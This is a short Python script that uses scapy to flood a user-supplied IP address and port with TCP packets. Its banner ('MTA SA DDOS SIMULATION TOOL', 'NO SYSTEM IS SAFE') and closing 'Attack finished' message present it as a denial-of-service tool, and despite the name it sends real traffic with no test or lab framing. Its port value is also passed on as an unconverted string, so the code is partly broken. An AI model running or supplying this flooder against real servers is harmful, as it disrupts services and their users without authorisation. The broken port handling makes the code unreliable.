# ddos_simulation.py

from scapy.all import *
import time

def send_ddos(ip, port, packets):
    print(f"Sending {packets} packets to {ip}:{port}")
    for _ in range(packets):
        ip_packet = IP(dst=ip)
        tcp_packet = TCP(sport=1024, dport=port)
        packet = ip_packet / tcp_packet
        send(packet, verbose=False)

def main():
    print("MTA SA DDOS SIMULATION TOOL")
    print("NO SYSTEM IS SAFE")
    print("<<<<<WE ARE HERE>>>>>")

    ip = input("Enter the target IP address: ")
    port = input("Enter the target port: ")
    packets = input("Enter the number of packets to send: ")

    try:
        packets = int(packets)
    except ValueError:
        print("Invalid number of packets. Please enter a valid integer.")
        return

    send_ddos(ip, port, packets)
    print("Attack finished")

if __name__ == "__main__":
    main()
